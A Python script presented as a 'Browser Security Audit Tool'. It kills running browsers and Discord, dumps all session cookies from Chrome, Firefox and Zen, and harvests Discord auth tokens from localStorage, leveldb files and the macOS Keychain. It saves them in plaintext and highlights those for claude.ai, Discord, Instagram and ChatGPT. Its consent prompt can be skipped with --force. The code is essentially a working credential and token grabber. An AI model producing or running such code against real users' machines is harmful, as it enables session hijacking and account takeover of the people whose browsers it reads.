#!/usr/bin/env python3

import os
import sys
import sqlite3
import subprocess
import json
from datetime import datetime
from pathlib import Path

class BrowserAudit:
    COLORS = {
        'RESET': '\033[0m',
        'RED': '\033[91m',
        'GREEN': '\033[92m',
        'YELLOW': '\033[93m',
        'BLUE': '\033[94m',
        'MAGENTA': '\033[95m',
        'CYAN': '\033[96m',
    }

    def __init__(self, force_run=False, use_keychain=False, no_log=False):
        self.force_run = force_run
        self.use_keychain = use_keychain
        self.no_log = no_log
        self.os_type = sys.platform
        self.home = Path.home()
        self.setup_output_dirs()

    def setup_output_dirs(self):
        if self.no_log:
            self.audit_dir = None
            self.cookies_dir = None
            self.log_file = None
            return

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.audit_dir = self.home / ".audit"
        self.audit_dir.mkdir(exist_ok=True)
        self.cookies_dir = self.audit_dir / f"cookies_{timestamp}"
        self.cookies_dir.mkdir(exist_ok=True)
        self.log_file = self.audit_dir / f"audit_{timestamp}.log"

    def log(self, level, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_msg = f"[{timestamp}] [{level}] {message}"
        print(log_msg)
        if not self.no_log and self.log_file:
            with open(self.log_file, 'a') as f:
                f.write(log_msg + '\n')

    def save_to_file(self, filename, content):
        if self.no_log or not self.cookies_dir:
            return
        with open(self.cookies_dir / filename, 'a') as f:
            f.write(content)

    def check_authorization(self):
        if self.force_run:
            return

        print(f"\n{self.COLORS['RED']}[===========================================]{self.COLORS['RESET']}")
        print(f"{self.COLORS['RED']}|  BROWSER AUDIT - RESPONSIBLE USE ONLY  |{self.COLORS['RESET']}")
        print(f"{self.COLORS['RED']}[===========================================]{self.COLORS['RESET']}\n")
        print(f"{self.COLORS['YELLOW']}This tool extracts SENSITIVE data:{self.COLORS['RESET']}")
        print(f"  - Authentication tokens")
        print(f"  - Session cookies")
        print(f"  - localStorage data")
        print(f"  - Stored credentials\n")
        print(f"{self.COLORS['YELLOW']}AUTHORIZED USE ONLY:{self.COLORS['RESET']}")
        print(f"  - Your own systems")
        print(f"  - Systems with explicit permission")
        print(f"  - Test/development environments\n")

        response = input("Do you have authorization? (y/n): ").strip().lower()
        if response != 'y':
            print(f"{self.COLORS['RED']}Audit cancelled.{self.COLORS['RESET']}")
            sys.exit(1)

    def close_browsers(self):
        import time

        browsers = ['chrome', 'firefox', 'zen', 'Discord']
        running = []

        for browser in browsers:
            try:
                result = subprocess.run(['pgrep', '-i', browser],
                                      capture_output=True)
                if result.returncode == 0:
                    running.append(browser)
            except:
                pass

        if running:
            print(f"\n{self.COLORS['YELLOW']}[!] Closing browsers: {', '.join(running)}{self.COLORS['RESET']}")
            for browser in browsers:
                try:
                    subprocess.run(['pkill', '-9', '-i', browser],
                                 capture_output=True)
                except:
                    pass
            time.sleep(1)
            print(f"{self.COLORS['GREEN']}[OK] Browsers closed{self.COLORS['RESET']}\n")
            self.log("INFO", "Browsers closed automatically")

    def extract_chrome_cookies(self):
        if self.os_type == 'darwin':
            path = self.home / "Library/Application Support/Google/Chrome/Default/Cookies"
        else:
            path = self.home / ".config/google-chrome/Default/Cookies"

        if not path.exists():
            return

        print(f"{self.COLORS['CYAN']}[*] Extracting Chrome cookies...{self.COLORS['RESET']}")
        try:
            conn = sqlite3.connect(path)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, value FROM cookies")

            if self.cookies_dir:
                with open(self.cookies_dir / "chrome_cookies.txt", 'w') as f:
                    for host, name, value in cursor.fetchall():
                        f.write(f"Domain: {host}\n")
                        f.write(f"Name: {name}\n")
                        f.write(f"Value: {value}\n")
                        f.write("-" * 60 + "\n\n")

            conn.close()
            print(f"{self.COLORS['GREEN']}[OK] Chrome cookies extracted{self.COLORS['RESET']}\n")
        except Exception as e:
            self.log("ERROR", f"Chrome extraction failed: {e}")

    def extract_firefox_cookies(self):
        if self.os_type == 'darwin':
            profile_dir = self.home / "Library/Application Support/Firefox/Profiles"
        else:
            profile_dir = self.home / ".mozilla/firefox"

        if not profile_dir.exists():
            return

        print(f"{self.COLORS['CYAN']}[*] Extracting Firefox cookies...{self.COLORS['RESET']}")
        found = False
        try:
            for subdir in profile_dir.glob("*/"):
                cookies_file = subdir / "cookies.sqlite"
                if cookies_file.exists():
                    conn = sqlite3.connect(cookies_file)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host, name, value FROM moz_cookies")

                    if self.cookies_dir:
                        with open(self.cookies_dir / "firefox_cookies.txt", 'w') as f:
                            for host, name, value in cursor.fetchall():
                                f.write(f"Domain: {host}\n")
                                f.write(f"Name: {name}\n")
                                f.write(f"Value: {value}\n")
                                f.write("-" * 60 + "\n\n")

                    conn.close()
                    found = True

            if found:
                print(f"{self.COLORS['GREEN']}[OK] Firefox cookies extracted{self.COLORS['RESET']}\n")
        except Exception as e:
            self.log("ERROR", f"Firefox extraction failed: {e}")

    def extract_zen_cookies(self):
        if self.os_type == 'darwin':
            zen_dir = self.home / "Library/Application Support/zen/Profiles"
        else:
            if (self.home / ".zen").exists():
                zen_dir = self.home / ".zen"
            else:
                zen_dir = self.home / ".config/zen/Profiles"

        if not zen_dir.exists():
            return

        print(f"{self.COLORS['CYAN']}[*] Extracting Zen cookies...{self.COLORS['RESET']}")
        found = False
        try:
            for profile_dir in zen_dir.glob("*/"):
                cookies_file = profile_dir / "cookies.sqlite"
                if cookies_file.exists():
                    conn = sqlite3.connect(cookies_file)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host, name, value FROM moz_cookies")

                    if self.cookies_dir:
                        with open(self.cookies_dir / "zen_cookies.txt", 'w') as f:
                            for host, name, value in cursor.fetchall():
                                f.write(f"Domain: {host}\n")
                                f.write(f"Name: {name}\n")
                                f.write(f"Value: {value}\n")
                                f.write("-" * 60 + "\n\n")

                    conn.close()
                    found = True

            if found:
                print(f"{self.COLORS['GREEN']}[OK] Zen cookies extracted{self.COLORS['RESET']}\n")
        except Exception as e:
            self.log("ERROR", f"Zen extraction failed: {e}")

    def extract_discord_web_tokens(self):
        print(f"{self.COLORS['CYAN']}[*] Extracting Discord Web tokens (localStorage)...{self.COLORS['RESET']}")

        if self.os_type == 'darwin':
            firefox_profiles = self.home / "Library/Application Support/Firefox/Profiles"
            zen_profiles = self.home / "Library/Application Support/zen/Profiles"
        else:
            firefox_profiles = self.home / ".mozilla/firefox"
            zen_profiles_alt = self.home / ".zen"
            zen_profiles = self.home / ".config/zen/Profiles" if not zen_profiles_alt.exists() else zen_profiles_alt

        found_any = False
        profile_dirs = []

        if firefox_profiles.exists():
            profile_dirs.extend(firefox_profiles.glob("*/"))
        if zen_profiles.exists():
            profile_dirs.extend(zen_profiles.glob("*/"))

        for profile_dir in profile_dirs:
            localStorage_path = profile_dir / "storage/default/https+++discord.com/ls/data.sqlite"

            if not localStorage_path.exists():
                continue

            try:
                conn = sqlite3.connect(localStorage_path)
                cursor = conn.cursor()
                cursor.execute("SELECT key, value FROM data WHERE key='token'")

                for key, value in cursor.fetchall():
                    if value and len(str(value)) > 50:
                        if self.cookies_dir:
                            with open(self.cookies_dir / "discord_web_tokens.txt", 'a') as f:
                                f.write(f"[Discord Web localStorage]\n")
                                f.write(f"Key: {key}\n")
                                f.write(f"Token: {value}\n")
                                f.write("-" * 60 + "\n\n")
                        found_any = True

                conn.close()
            except Exception as e:
                self.log("DEBUG", f"Discord Web token extraction: {e}")

        if found_any:
            print(f"{self.COLORS['GREEN']}[OK] Discord Web tokens extracted{self.COLORS['RESET']}\n")

    def extract_keychain_tokens(self):
        if self.os_type != 'darwin':
            return

        print(f"{self.COLORS['CYAN']}[*] Checking Discord tokens in Keychain...{self.COLORS['RESET']}")
        self.log("INFO", "Starting Keychain token extraction")

        try:
            result = subprocess.run(
                ['security', 'find-internet-password', '-s', 'discord.com', '-w'],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0 and result.stdout.strip():
                token = result.stdout.strip()
                if self.cookies_dir:
                    with open(self.cookies_dir / "discord_tokens.txt", 'a') as f:
                        f.write(f"[Discord-Keychain] {token}\n")
                print(f"{self.COLORS['GREEN']}[OK] Keychain token found{self.COLORS['RESET']}\n")
                self.log("INFO", "Discord Keychain token extracted")
                return True
            else:
                print(f"{self.COLORS['YELLOW']}[!] No Discord token in Keychain (may be locked){self.COLORS['RESET']}\n")
        except subprocess.TimeoutExpired:
            print(f"{self.COLORS['YELLOW']}[!] Keychain access timed out (may need password){self.COLORS['RESET']}\n")
            self.log("WARNING", "Keychain timeout - may need password")
        except Exception as e:
            self.log("WARNING", f"Keychain extraction failed: {e}")

        return False

    def extract_discord_tokens(self):
        import glob
        import re

        print(f"{self.COLORS['CYAN']}[*] Extracting Discord Desktop tokens...{self.COLORS['RESET']}")
        self.log("INFO", "Starting Discord Desktop token extraction")

        if self.os_type == 'darwin':
            discord_dirs = {
                "Discord": self.home / "Library/Application Support/discord",
                "Discord Canary": self.home / "Library/Application Support/discordcanary",
                "Discord PTB": self.home / "Library/Application Support/discordptb",
                "Equicord": self.home / "Library/Application Support/Equicord"
            }
        else:
            discord_dirs = {
                "Discord": self.home / ".config/discord",
                "Discord Canary": self.home / ".config/discordcanary",
                "Discord PTB": self.home / ".config/discordptb",
                "Equicord": self.home / ".config/Equicord"
            }

        found_any = False
        token_pattern = r'[A-Za-z0-9_-]{20,}\.[\w-]{6}\.[\w-]{27,}|mfa\.[a-zA-Z0-9_\-]{84,}'

        for app_name, discord_dir in discord_dirs.items():
            if not discord_dir.exists():
                continue

            leveldb_path = discord_dir / "Local Storage/leveldb"
            if not leveldb_path.exists():
                continue

            try:
                files = glob.glob(f"{leveldb_path}/*.ldb") + glob.glob(f"{leveldb_path}/*.log")
                if not files and os.geteuid() != 0:
                    self.log("WARNING", f"{app_name} files not accessible - try running with sudo")
                    continue

                for file in files:
                    try:
                        with open(file, 'r', encoding='ISO-8859-1') as f:
                            content = f.read()

                            tokens = re.findall(token_pattern, content)
                            if tokens and self.cookies_dir:
                                with open(self.cookies_dir / "discord_tokens.txt", 'a') as out:
                                    for token in set(tokens):
                                        out.write(f"[{app_name}] {token}\n")
                                        found_any = True
                    except PermissionError:
                        self.log("WARNING", f"Permission denied reading {file} - try with sudo")
                    except:
                        pass
            except Exception as e:
                self.log("ERROR", f"Discord {app_name} extraction failed: {e}")

        self.log("INFO", f"Discord extraction complete, found tokens: {found_any}")

        if found_any:
            print(f"{self.COLORS['GREEN']}[OK] Discord tokens extracted{self.COLORS['RESET']}")
            print(f"{self.COLORS['YELLOW']}[!] Tokens may be base64-encoded or encrypted{self.COLORS['RESET']}\n")
        else:
            print(f"{self.COLORS['YELLOW']}[!] No Discord tokens found (try: sudo ./dist/audit-macos){self.COLORS['RESET']}\n")

    def filter_display_content(self, content, filename):
        if 'discord_tokens' in filename or 'discord_web' in filename:
            return content

        important_domains = ['claude.ai', 'discord', 'instagram', 'chatgpt']
        lines = content.split('\n')
        filtered = []
        include_block = False

        for i, line in enumerate(lines):
            if line.startswith('Domain:'):
                domain = line.split('Domain:')[1].strip().lower()
                include_block = any(d in domain for d in important_domains)

            if include_block:
                filtered.append(line)
                if i + 1 < len(lines) and lines[i + 1].strip() == '':
                    filtered.append('')
                    include_block = False

        return '\n'.join(filtered).strip()

    def display_results(self):
        if self.no_log:
            print(f"\n{self.COLORS['CYAN']}[*] --no-log active: no files saved{self.COLORS['RESET']}\n")
            return

        print(f"\n{self.COLORS['BLUE']}{'=' * 60}{self.COLORS['RESET']}")
        print(f"{self.COLORS['BLUE']}{'EXTRACTED SENSITIVE DATA':^60}{self.COLORS['RESET']}")
        print(f"{self.COLORS['BLUE']}{'=' * 60}{self.COLORS['RESET']}\n")

        sections = [
            ("chrome_cookies.txt", "Chrome Cookies"),
            ("firefox_cookies.txt", "Firefox Cookies"),
            ("zen_cookies.txt", "Zen Cookies"),
            ("discord_web_tokens.txt", "Discord Web Tokens (localStorage)"),
            ("discord_tokens.txt", "Discord Desktop Tokens"),
        ]

        for filename, title in sections:
            filepath = self.cookies_dir / filename
            print(f"{self.COLORS['MAGENTA']}{title}:{self.COLORS['RESET']}")
            print(f"{self.COLORS['BLUE']}{'-' * 60}{self.COLORS['RESET']}")

            if filepath.exists():
                try:
                    with open(filepath, 'r') as f:
                        content = f.read().strip()
                        if content:
                            filtered = self.filter_display_content(content, filename)
                            if filtered:
                                print(f"{self.COLORS['YELLOW']}{filtered}{self.COLORS['RESET']}")
                            else:
                                print(f"{self.COLORS['CYAN']}(no data found for main domains){self.COLORS['RESET']}")
                        else:
                            print(f"{self.COLORS['CYAN']}(no data found){self.COLORS['RESET']}")
                except Exception as e:
                    print(f"{self.COLORS['RED']}Error: {e}{self.COLORS['RESET']}")
            else:
                print(f"{self.COLORS['CYAN']}(no data found){self.COLORS['RESET']}")

            print()  # Blank line between sections

    def run(self):
        print(f"\n{self.COLORS['BLUE']}[===========================================]{self.COLORS['RESET']}")
        print(f"{self.COLORS['BLUE']}    Browser Security Audit Tool{self.COLORS['RESET']}")
        print(f"{self.COLORS['BLUE']}[===========================================]{self.COLORS['RESET']}\n")

        self.check_authorization()
        self.close_browsers()

        self.log("INFO", "Audit started")

        self.extract_chrome_cookies()
        self.extract_firefox_cookies()
        self.extract_zen_cookies()
        self.extract_discord_web_tokens()
        self.extract_keychain_tokens()
        self.extract_discord_tokens()

        self.display_results()

        if not self.no_log:
            print(f"\n{self.COLORS['BLUE']}[===========================================]{self.COLORS['RESET']}")
            print(f"{self.COLORS['GREEN']}Output: {self.audit_dir}{self.COLORS['RESET']}")
            print(f"{self.COLORS['BLUE']}[===========================================]{self.COLORS['RESET']}\n")

        self.log("INFO", "Audit completed successfully")

def main():
    import argparse

    parser = argparse.ArgumentParser(description='Browser Security Audit Tool')
    parser.add_argument('--keychain', '-k', action='store_true',
                       help='Use Keychain access (macOS)')
    parser.add_argument('--force', '-f', action='store_true',
                       help='Skip authorization confirmation')
    parser.add_argument('--no-log', action='store_true',
                       help='Do not save logs or cookie files (output only)')

    args = parser.parse_args()

    audit = BrowserAudit(force_run=args.force, use_keychain=args.keychain, no_log=args.no_log)
    audit.run()

if __name__ == '__main__':
    main()

